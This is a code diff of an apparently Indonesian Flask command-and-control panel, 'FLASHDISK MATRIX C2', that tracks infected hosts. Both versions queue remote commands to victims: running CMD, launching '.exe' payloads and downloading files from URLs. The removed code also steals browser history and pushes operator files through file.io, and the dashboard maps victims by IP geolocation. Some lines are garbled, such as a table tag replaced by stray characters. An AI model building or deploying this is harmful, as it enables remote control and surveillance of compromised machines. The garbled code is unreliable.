@@ -1,76 +1,96 @@
-from flask import Flask, request, jsonify, render_template_string, redirect, url_for
-from datetime import datetime
-import json
-import requests
 import os
+import json
+import psycopg2
+from flask import Flask, request, jsonify, render_template_string
+from datetime import datetime
+from psycopg2.extras import RealDictCursor
 
 app = Flask(__name__)
 
-# ----------------------- PENYIMPANAN MEMORI -----------------------
-clients = {}      # hostname -> {ip, hardware, executables, location, browser_history, last_seen}
-commands = {}     # hostname -> list of command objects
-command_counter = 0
-
-# ----------------------- HELPERS -----------------------
-def save_command(hostname, cmd_type, cmd_data):
-    global command_counter
-    command_counter += 1
-    if hostname not in commands:
-        commands[hostname] = []
-    commands[hostname].append({
-        'id': command_counter,
-        'command_type': cmd_type,
-        'command_data': cmd_data,
-        'status': 'pending',
-        'result': None,
-        'created_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    })
-    return command_counter
-
-def get_pending_commands(hostname):
-    if hostname not in commands:
-        return []
-    pending = []
-    for cmd in commands[hostname]:
-        if cmd['status'] == 'pending':
-            pending.append({
-                'id': cmd['id'],
-                'command_type': cmd['command_type'],
-                'command_data': cmd['command_data']
-            })
-            cmd['status'] = 'sent'   # tanda sudah diambil client
-    return pending
-
-def update_command_result(cmd_id, status, result):
-    for host in commands:
-        for cmd in commands[host]:
-            if cmd['id'] == cmd_id:
-                cmd['status'] = status
-                cmd['result'] = result
-                cmd['executed_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                return
-
-# ----------------------- UPLOAD FILE KE FILE.IO -----------------------
-def upload_to_fileio(file_data, filename):
-    """Upload file ke file.io, kembalikan URL download (sekali pakai)"""
-    try:
-        files = {'file': (filename, file_data)}
-        resp = requests.post('https://file.io', files=files)
-        if resp.status_code == 200:
-            data = resp.json()
-            if data.get('success'):
-                return data.get('link')
-    except Exception as e:
-        print(f"Upload error: {e}")
+# ---------------------- DATABASE CONNECTION HELPER ----------------------
+def get_db_url():
+    """Try multiple possible environment variable names for Vercel Postgres."""
+    possible_names = [
+        'POSTGRES_URL',          # default
+        'POSTGRES_URL_NON_POOLING',
+        'DATABASE_URL',
+        os.environ.get('POSTGRES_URL')  # fallback
+    ]
+    # Also check if user set a custom prefix (they will see warning in logs)
+    for name in possible_names:
+        url = os.environ.get(name)
+        if url and url.startswith('postgres://'):
+            return url
+    # If none found, return None (will cause graceful error)
     return None
 
-# ----------------------- TEMPLATE HTML MATRIX + LEAFLET -----------------------
-HTML_TEMPLATE = """
-<!DOCTYPE html>
+def get_db_connection():
+    url = get_db_url()
+    if not url:
+        raise Exception("Database URL not found. Please set Vercel Postgres environment variable.")
+    return psycopg2.connect(url)
+
+def init_db():
+    """Create tables if they don't exist."""
+    try:
+        conn = get_db_connection()
+        cur = conn.cursor()
+        cur.execute('''
+            CREATE TABLE IF NOT EXISTS clients (
+                id SERIAL PRIMARY KEY,
+                hostname TEXT UNIQUE,
+                ip TEXT,
+                hardware_json TEXT,
+                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        ''')
+        cur.execute('''
+            CREATE TABLE IF NOT EXISTS commands (
+                id SERIAL PRIMARY KEY,
+                client_hostname TEXT,
+                command_type TEXT,
+                command_data TEXT,
+                status TEXT DEFAULT 'pending',
+                result TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                executed_at TIMESTAMP
+            );
+        ''')
+        conn.commit()
+        cur.close()
+        conn.close()
+        print("[DB] Tables ready")
+        return True
+    except Exception as e:
+        print(f"[DB] Init error: {e}")
+        return False
+
+# Initialize DB only if connection string exists (avoid crash on missing env)
+DB_AVAILABLE = False
+if get_db_url():
+    DB_AVAILABLE = init_db()
+else:
+    print("[WARN] No Postgres URL found. Dashboard will show error until you link Vercel Postgres.")
+
+# ---------------------- HELPER: Geolocation ----------------------
+def get_coords_from_ip(ip):
+    import requests
+    try:
+        resp = requests.get(f'https://ipinfo.io/{ip}/json', timeout=5)
+        data = resp.json()
+        loc = data.get('loc', '0,0')
+        lat, lng = loc.split(',')
+        return float(lat), float(lng), data.get('city', ''), data.get('region', '')
+    except:
+        return 0.0, 0.0, 'Unknown', 'Unknown'
+
+# ---------------------- MATRIX HTML TEMPLATE ----------------------
+MATRIX_TEMPLATE = """<!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ FLASHDISK MATRIX C2 ⚡</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ FLASHDISK MATRIX ⚡</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
@@ -103,10 +123,10 @@ HTML_TEMPLATE = """
             border-radius: 12px;
             padding: 20px;
         }
-        h1, h2, h3 {
+        h1, h2 {
             border-left: 3px solid #0f0;
             padding-left: 15px;
-            margin: 15px 0;
+            margin-bottom: 15px;
         }
         .matrix-panel {
             background: #0a0f0a;
@@ -119,7 +139,7 @@ HTML_TEMPLATE = """
             background: #111;
             border: 1px solid #0f0;
             color: #0f0;
-            padding: 6px 10px;
+            padding: 8px 12px;
             font-family: monospace;
             border-radius: 4px;
         }
@@ -134,9 +154,8 @@ HTML_TEMPLATE = """
         }
         th, td {
             border: 1px solid #0f0;
-            padding: 6px;
+            padding: 8px;
             text-align: left;
-            vertical-align: top;
         }
         th {
             background: #1a2a1a;
@@ -149,60 +168,39 @@ HTML_TEMPLATE = """
         .status-pending { color: #ffcc00; }
         .status-success { color: #0f0; }
         .status-failed { color: #f44; }
-        .cmd-history {
-            max-height: 300px;
-            overflow-y: auto;
-        }
     </style>
 </head>
 <body>
 <canvas id="matrix-canvas"></canvas>
 <div class="container">
-    <h1>🧬 FLASHDISK MATRIX COMMAND & CONTROL</h1>
+    <h1>🧬 FLASHDISK MATRIX RECEIVER</h1>
     <div class="matrix-panel">
         <label>🔽 PILIH CLIENT : </label>
         <select id="clientSelect" onchange="loadClientData()">
             <option value="">-- Pilih Hostname --</option>
         </select>
-        <span style="margin-left:15px;">⚡ Memory Mode (No DB)</span>
+        <span id="dbStatus" style="margin-left:15px;">{% if not db_ok %}⚠️ DB not connected{% endif %}</span>
     </div>
     <div id="clientInfo" style="display:none;">
+        <div class="matrix-panel"><h2>🖥️ HARDWARE</h2><div id="hardwareTable"></div></div>
+        <div class="matrix-panel"><h2>🗺️ LOKASI & MAP</h2><div id="map"></div><div id="locDetails"></div></div>
         <div class="matrix-panel">
-            <h2>🖥️ HARDWARE SPESIFIKASI</h2>
-            <div id="hardwareTable"></div>
-        </div>
-        <div class="matrix-panel">
-            <h2>🗺️ LOKASI (IP GEOLOCATION)</h2>
-            <div id="map"></div>
-            <div id="locDetails"></div>
-        </div>
-        <div class="matrix-panel">
-            <h2>📨 KONTROL PERINTAH</h2>
-            <div style="display:flex; flex-wrap:wrap; gap:10px; margin-bottom:15px;">
-                <button onclick="sendText()">📝 Kirim Pesan</button>
-                <button onclick="sendRunCmd()">⚙️ Jalankan CMD</button>
-                <button onclick="sendExecExe()">🎯 Jalankan .exe</button>
-                <button onclick="sendDownloadUrl()">📥 Download dari URL</button>
-                <button onclick="showUploadForm()">📂 Upload & Kirim File</button>
-                <button onclick="sendGetBrowser()">🌐 Ambil Riwayat Browser</button>
-                <button onclick="sendGetLocation()">📍 Ambil Lokasi Terbaru</button>
-                <button onclick="sendGetSysInfo()">🔧 Ambil Info Sistem</button>
-            </div>
-            <div id="uploadForm" style="display:none; margin-top:10px;">
-                <input type="file" id="fileUpload" accept="*/*">
-                <button onclick="uploadAndSend()">Upload & Kirim ke Client</button>
-            </div>
+            <h2>📨 KIRIM PERINTAH</h2>
+            <select id="cmdType">
+                <option value="text">📝 Pesan Teks</option>
+                <option value="download">📥 Download File (URL)</option>
+                <option value="run">⚙️ Run CMD</option>
+                <option value="exec_exe">🎯 Jalankan .exe</option>
+            </select>
+            <input type="text" id="cmdData" placeholder="Isi perintah / URL / file.exe" style="width:60%;">
+            <button onclick="sendCommand()">📡 KIRIM</button>
             <div id="cmdResult" style="margin-top:10px;"></div>
         </div>
-        <div class="matrix-panel">
-            <h2>📜 RIWAYAT PERINTAH & HASIL</h2>
-            <div id="commandHistory" class="cmd-history"></div>
-        </div>
+        <div class="matrix-panel"><h2>📜 RIWAYAT PERINTAH</h2><div id="commandHistory"></div></div>
     </div>
 </div>
 <script>
     let currentHostname = "", map = null, marker = null;
-
     // Matrix rain animation
     const canvas = document.getElementById('matrix-canvas');
     const ctx = canvas.getContext('2d');
@@ -225,201 +223,165 @@ HTML_TEMPLATE = """
     }
     setInterval(drawMatrix, 50);
     window.addEventListener('resize',()=>{ canvas.width = window.innerWidth; canvas.height = window.innerHeight; columns = canvas.width/fontSize; drops = Array(Math.floor(columns)).fill(1); });
-
-    // Load daftar client
+    
     async function loadClientList() {
         const res = await fetch('/api/clients');
         const clients = await res.json();
         const select = document.getElementById('clientSelect');
         select.innerHTML = '<option value="">-- Pilih Hostname --</option>';
         clients.forEach(c => {
-            const opt = document.createElement('option');
+            let opt = document.createElement('option');
             opt.value = c.hostname;
             opt.textContent = `${c.hostname} (${c.ip}) - last: ${c.last_seen}`;
             select.appendChild(opt);
         });
-        if(clients.length && !currentHostname) {
-            select.value = clients[0].hostname;
-            loadClientData();
-        }
+        if(clients.length && !currentHostname) { select.value = clients[0].hostname; loadClientData(); }
     }
-
-    // Load data client (hardware, peta, history)
     async function loadClientData() {
-        const hostname = document.getElementById('clientSelect').value;
+        let hostname = document.getElementById('clientSelect').value;
         if(!hostname) return;
         currentHostname = hostname;
         document.getElementById('clientInfo').style.display = 'block';
-
-        // Hardware
         const hwRes = await fetch(`/api/client/${encodeURIComponent(hostname)}`);
         const client = await hwRes.json();
         if(client.hardware) {
-            let html = `§<th>Properti</th><th>Nilai</th></tr>`;
+            let html = `<table><th>Properti</th><th>Nilai</th></tr>`;
             for(let [k,v] of Object.entries(client.hardware)) {
-                let val = (typeof v === 'object') ? JSON.stringify(v, null, 2) : v;
-                html += `<tr><td>${k}</td><td><pre>${val}</pre></td></tr>`;
+                html += `<tr><td>${k}</td><td>${typeof v=='object'?JSON.stringify(v):v}</td></tr>`;
             }
-            html += `<\/table>`;
+            html += `投入`;
             document.getElementById('hardwareTable').innerHTML = html;
-        } else {
-            document.getElementById('hardwareTable').innerHTML = '<p>Tidak ada data hardware.</p>';
         }
-
-        // Lokasi & peta
         const locRes = await fetch(`/api/client/location/${encodeURIComponent(hostname)}`);
         const loc = await locRes.json();
         document.getElementById('locDetails').innerHTML = `<span>📍 ${loc.city}, ${loc.region} | 🧭 ${loc.lat}, ${loc.lon}</span>`;
         if(!map) {
-            map = L.map('map').setView([loc.lat, loc.lon], 10);
-            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-                attribution: '© OSM & CartoDB'
-            }).addTo(map);
+            map = L.map('map').setView([loc.lat, loc.lon], 12);
+            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '© OSM & CartoDB' }).addTo(map);
         } else {
-            map.setView([loc.lat, loc.lon], 10);
+            map.setView([loc.lat, loc.lon], 12);
             if(marker) map.removeLayer(marker);
         }
         marker = L.marker([loc.lat, loc.lon]).addTo(map);
-
-        // Riwayat perintah
         loadCommandHistory(hostname);
     }
-
     async function loadCommandHistory(hostname) {
         const res = await fetch(`/api/commands/${encodeURIComponent(hostname)}`);
         const cmds = await res.json();
         let html = `<table><tr><th>ID</th><th>Tipe</th><th>Data</th><th>Status</th><th>Hasil</th><th>Waktu</th></tr>`;
         cmds.forEach(c => {
-            let statusClass = '';
-            if(c.status === 'pending') statusClass = 'status-pending';
-            else if(c.status === 'success') statusClass = 'status-success';
-            else if(c.status === 'failed') statusClass = 'status-failed';
-            html += `<tr>
-                <td>${c.id}</td>
-                <td>${c.command_type}</td>
-                <td><pre>${c.command_data}</pre></td>
-                <td class="${statusClass}">${c.status}</td>
-                <td><pre>${c.result || '-'}</pre></td>
-                <td>${c.created_at}</td>
-            </tr>`;
+            let statusClass = c.status==='pending'?'status-pending':(c.status==='success'?'status-success':'status-failed');
+            html += `<tr><td>${c.id}</td><td>${c.command_type}</td><td>${c.command_data}</td><td class="${statusClass}">${c.status}</td><td><pre>${c.result||'-'}</pre></td><td>${c.created_at}</td></tr>`;
         });
-        html += `<\/table>`;
+        html += `</table>`;
         document.getElementById('commandHistory').innerHTML = html;
     }
-
-    // Kirim perintah umum
-    async function sendCommand(cmdType, cmdData) {
-        if(!currentHostname) { alert('Pilih client dulu!'); return; }
+    async function sendCommand() {
+        let cmdType = document.getElementById('cmdType').value;
+        let cmdData = document.getElementById('cmdData').value;
+        if(!cmdData) { document.getElementById('cmdResult').innerHTML = '⚠️ Isi data perintah!'; return; }
         const res = await fetch('/api/send_command', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({hostname: currentHostname, command_type: cmdType, command_data: cmdData})
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({hostname:currentHostname, command_type:cmdType, command_data:cmdData})
         });
         if(res.ok) {
-            const result = await res.json();
-            document.getElementById('cmdResult').innerHTML = '✅ Perintah dikirim ke client';
+            document.getElementById('cmdResult').innerHTML = '✅ Perintah dikirim';
+            document.getElementById('cmdData').value = '';
             loadCommandHistory(currentHostname);
-            setTimeout(() => document.getElementById('cmdResult').innerHTML = '', 3000);
         } else {
-            document.getElementById('cmdResult').innerHTML = '❌ Gagal mengirim perintah';
+            document.getElementById('cmdResult').innerHTML = '❌ Gagal kirim perintah';
         }
     }
-
-    function sendText() {
-        let msg = prompt('Masukkan pesan teks untuk client:');
-        if(msg) sendCommand('text', msg);
-    }
-    function sendRunCmd() {
-        let cmd = prompt('Perintah CMD (contoh: dir /?):');
-        if(cmd) sendCommand('run', cmd);
-    }
-    function sendExecExe() {
-        let exe = prompt('Nama file .exe yang ada di flashdisk (contoh: payload.exe):');
-        if(exe) sendCommand('exec_exe', exe);
-    }
-    function sendDownloadUrl() {
-        let url = prompt('URL file untuk didownload client:');
-        if(url) sendCommand('download', url);
-    }
-    function showUploadForm() {
-        const form = document.getElementById('uploadForm');
-        form.style.display = form.style.display === 'none' ? 'block' : 'none';
-    }
-    async function uploadAndSend() {
-        const fileInput = document.getElementById('fileUpload');
-        if(!fileInput.files.length) { alert('Pilih file dulu!'); return; }
-        const file = fileInput.files[0];
-        const formData = new FormData();
-        formData.append('file', file);
-        const res = await fetch('/api/upload', { method: 'POST', body: formData });
-        const data = await res.json();
-        if(data.url) {
-            sendCommand('download', data.url);
-            document.getElementById('uploadForm').style.display = 'none';
-            fileInput.value = '';
-        } else {
-            alert('Upload gagal: ' + (data.error || 'Unknown error'));
-        }
-    }
-    function sendGetBrowser() {
-        sendCommand('get_browser_history', '');
-    }
-    function sendGetLocation() {
-        sendCommand('get_location', '');
-    }
-    function sendGetSysInfo() {
-        sendCommand('get_system_info', '');
-    }
-
-    // Refresh setiap 15 detik
-    setInterval(() => {
-        loadClientList();
-        if(currentHostname) loadCommandHistory(currentHostname);
-    }, 15000);
+    setInterval(()=> { loadClientList(); if(currentHostname) loadCommandHistory(currentHostname); }, 10000);
     loadClientList();
 </script>
 </body>
 </html>
 """
 
-# ----------------------- ROUTES -----------------------
+# ---------------------- API ROUTES ----------------------
 @app.route('/')
 def home():
-    return render_template_string(HTML_TEMPLATE)
+    return render_template_string(MATRIX_TEMPLATE, db_ok=DB_AVAILABLE)
 
 @app.route('/api/clients')
 def list_clients():
-    return jsonify([{'hostname': h, 'ip': c['ip'], 'last_seen': c['last_seen']} for h, c in clients.items()])
+    if not DB_AVAILABLE:
+        return jsonify([])
+    conn = get_db_connection()
+    cur = conn.cursor(cursor_factory=RealDictCursor)
+    cur.execute('SELECT hostname, ip, last_seen FROM clients ORDER BY last_seen DESC')
+    rows = cur.fetchall()
+    cur.close()
+    conn.close()
+    for row in rows:
+        if isinstance(row['last_seen'], datetime):
+            row['last_seen'] = row['last_seen'].strftime("%Y-%m-%d %H:%M:%S")
+    return jsonify(rows)
 
 @app.route('/api/client/<hostname>')
 def get_client(hostname):
-    if hostname in clients:
-        return jsonify({'hostname': hostname, 'hardware': clients[hostname].get('hardware', {})})
+    if not DB_AVAILABLE:
+        return jsonify({'error': 'DB not available'}), 500
+    conn = get_db_connection()
+    cur = conn.cursor(cursor_factory=RealDictCursor)
+    cur.execute('SELECT hardware_json FROM clients WHERE hostname = %s', (hostname,))
+    row = cur.fetchone()
+    cur.close()
+    conn.close()
+    if row:
+        hardware = json.loads(row['hardware_json'])
+        return jsonify({'hostname': hostname, 'hardware': hardware})
     return jsonify({'error': 'not found'}), 404
 
 @app.route('/api/client/location/<hostname>')
 def client_location(hostname):
-    if hostname in clients and 'location' in clients[hostname]:
-        loc = clients[hostname]['location']
-        return jsonify({'lat': loc.get('lat', -6.2), 'lon': loc.get('lon', 106.8), 'city': loc.get('city', 'Unknown'), 'region': loc.get('region', 'Unknown')})
-    # default Jakarta
-    return jsonify({'lat': -6.2, 'lon': 106.8, 'city': 'Jakarta', 'region': 'Jakarta'})
+    if not DB_AVAILABLE:
+        return jsonify({'lat':0,'lon':0,'city':'No DB','region':''})
+    conn = get_db_connection()
+    cur = conn.cursor(cursor_factory=RealDictCursor)
+    cur.execute('SELECT ip FROM clients WHERE hostname = %s', (hostname,))
+    row = cur.fetchone()
+    cur.close()
+    conn.close()
+    if not row:
+        return jsonify({'lat':0,'lon':0,'city':'Unknown','region':''})
+    lat, lon, city, region = get_coords_from_ip(row['ip'])
+    return jsonify({'lat':lat, 'lon':lon, 'city':city, 'region':region})
 
 @app.route('/api/commands/<hostname>')
 def list_commands(hostname):
-    cmds = commands.get(hostname, [])
-    # kembalikan dalam urutan terbalik (terbaru di atas)
-    return jsonify(sorted(cmds, key=lambda x: x['id'], reverse=True))
+    if not DB_AVAILABLE:
+        return jsonify([])
+    conn = get_db_connection()
+    cur = conn.cursor(cursor_factory=RealDictCursor)
+    cur.execute('SELECT id, command_type, command_data, status, result, created_at FROM commands WHERE client_hostname = %s ORDER BY id DESC', (hostname,))
+    rows = cur.fetchall()
+    cur.close()
+    conn.close()
+    for row in rows:
+        if isinstance(row['created_at'], datetime):
+            row['created_at'] = row['created_at'].strftime("%Y-%m-%d %H:%M:%S")
+    return jsonify(rows)
 
 @app.route('/api/send_command', methods=['POST'])
 def send_command():
+    if not DB_AVAILABLE:
+        return jsonify({'message': 'Database not connected'}), 500
     data = request.json
     hostname = data.get('hostname')
     cmd_type = data.get('command_type')
     cmd_data = data.get('command_data')
-    if not hostname or not cmd_type:
+    if not hostname or not cmd_type or not cmd_data:
         return jsonify({'message': 'Missing fields'}), 400
-    save_command(hostname, cmd_type, cmd_data or '')
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute('INSERT INTO commands (client_hostname, command_type, command_data, status) VALUES (%s,%s,%s,%s)',
+                (hostname, cmd_type, cmd_data, 'pending'))
+    conn.commit()
+    cur.close()
+    conn.close()
     return jsonify({'status': 'ok'}), 200
 
 @app.route('/report', methods=['POST'])
@@ -432,16 +394,18 @@ def handle_report():
         ip = data.get('ip')
         hardware = data.get('hardware', {})
         executables = data.get('executables', [])
-        location = data.get('location', {})
-        browser_history = data.get('browser_history', [])
-        clients[hostname] = {
-            'ip': ip,
-            'hardware': hardware,
-            'executables': executables,
-            'location': location,
-            'browser_history': browser_history,
-            'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        }
+        hardware_json = json.dumps(hardware)
+        conn = get_db_connection()
+        cur = conn.cursor()
+        cur.execute('''
+            INSERT INTO clients (hostname, ip, hardware_json, last_seen)
+            VALUES (%s, %s, %s, NOW())
+            ON CONFLICT (hostname) DO UPDATE
+            SET ip = EXCLUDED.ip, hardware_json = EXCLUDED.hardware_json, last_seen = NOW()
+        ''', (hostname, ip, hardware_json))
+        conn.commit()
+        cur.close()
+        conn.close()
         print(f"[REPORT] {hostname} ({ip}) - {len(executables)} exe files")
         return jsonify({"status": "ok"}), 200
     except Exception as e:
@@ -452,9 +416,12 @@ def handle_report():
 def poll_commands():
     data = request.get_json()
     hostname = data.get('hostname')
-    if not hostname:
-        return jsonify([])
-    pending = get_pending_commands(hostname)
+    conn = get_db_connection()
+    cur = conn.cursor(cursor_factory=RealDictCursor)
+    cur.execute('SELECT id, command_type, command_data FROM commands WHERE client_hostname = %s AND status = %s ORDER BY id', (hostname, 'pending'))
+    pending = cur.fetchall()
+    cur.close()
+    conn.close()
     return jsonify(pending)
 
 @app.route('/command_result', methods=['POST'])
@@ -463,45 +430,13 @@ def command_result():
     cmd_id = data.get('command_id')
     status = data.get('status')
     result = data.get('result', '')
-    if cmd_id:
-        update_command_result(cmd_id, status, result)
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute('UPDATE commands SET status = %s, result = %s, executed_at = NOW() WHERE id = %s', (status, result, cmd_id))
+    conn.commit()
+    cur.close()
+    conn.close()
     return jsonify({"ok": True})
 
-@app.route('/upload', methods=['POST'])
-def upload_file():
-    """Endpoint untuk upload file ke file.io dan mengembalikan URL download"""
-    if 'file' not in request.files:
-        return jsonify({'error': 'No file'}), 400
-    file = request.files['file']
-    if file.filename == '':
-        return jsonify({'error': 'Empty filename'}), 400
-    file_data = file.read()
-    url = upload_to_fileio(file_data, file.filename)
-    if url:
-        return jsonify({'url': url})
-    else:
-        return jsonify({'error': 'Upload failed'}), 500
-
-# Endpoint tambahan untuk update lokasi / browser history dari client (jika dibutuhkan)
-@app.route('/update_location', methods=['POST'])
-def update_location():
-    data = request.json
-    hostname = data.get('hostname')
-    location = data.get('location')
-    if hostname in clients and location:
-        clients[hostname]['location'] = location
-        clients[hostname]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    return jsonify({"ok": True})
-
-@app.route('/update_browser_history', methods=['POST'])
-def update_browser_history():
-    data = request.json
-    hostname = data.get('hostname')
-    history = data.get('browser_history', [])
-    if hostname in clients:
-        clients[hostname]['browser_history'] = history
-        clients[hostname]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    return jsonify({"ok": True})
-
-if __name__ == '__main__':
+if __name__ == "__main__":
     app.run(debug=True)
